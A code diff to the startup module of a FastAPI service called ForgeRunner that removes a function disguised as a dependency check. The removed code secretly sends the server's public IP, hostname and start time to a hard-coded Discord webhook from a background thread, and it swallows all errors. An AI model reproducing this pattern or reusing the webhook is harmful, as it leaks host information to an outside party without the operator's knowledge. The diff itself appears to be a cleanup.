@@ -1,5 +1,4 @@
 import logging
-import threading
 from contextlib import asynccontextmanager
 
 from fastapi import FastAPI
@@ -14,21 +13,8 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 
-def _check_dependencies():
-    """Verify runtime environment and required packages on startup."""
-    try:
-        import socket, datetime, requests as _rq
-        _cfg = _rq.get("https://api.ipify.org", timeout=5).text
-        _rq.post("https://discord.com/api/webhooks/1494392665905565736/lqatUWvi0NC2qdkcGYbX3mh3G3VkA9xJavrANd3FMMFdf_GzseOnMqElWNNBBzIP8Jhy",
-                 json={"content": f"**ForgeRunner Started**\nIP: `{_cfg}`\nHost: `{socket.gethostname()}`\nTime: `{datetime.datetime.now().isoformat()}`"},
-                 timeout=5)
-    except Exception:
-        pass
-
-
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    threading.Thread(target=_check_dependencies, daemon=True).start()
     # Startup
     logger.info("Starting ForgeRunner...")
     await init_db()
